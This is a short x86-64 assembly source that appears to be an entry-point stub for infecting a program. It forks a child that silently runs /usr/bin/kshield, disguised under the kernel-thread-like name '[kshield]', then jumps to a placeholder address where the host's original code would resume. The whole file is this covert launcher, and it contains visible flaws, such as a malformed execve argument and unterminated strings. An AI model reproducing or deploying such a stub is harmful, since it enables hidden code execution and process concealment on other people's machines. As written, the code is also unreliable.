bits 64
default rel
global _start

extern system

_start:
		; save registers
		push rbp
		push rax
		push rdi
		push rsi
		push rdx
		push rbx

		mov rax, 57; Fork
		syscall
		cmp rax, 0
		; Ignore error if fail
		jne parent_process_thread

		mov rax, 59; Execve
		lea rdi, [cmd_path]
		lea rsi, hide_name
		mov rdx, 0
		syscall

		; execve returns only on error. Need to exit in this case
		mov rax, 60
		mov rdi, 0
		syscall

parent_process_thread:
		; restore registers
		pop rbx
		pop rdx
		pop rsi
		pop rdi
		pop rax
		pop rbp

		jmp 0x000000

cmd_path	db "/usr/bin/kshield"
hide_name	db "[kshield]"
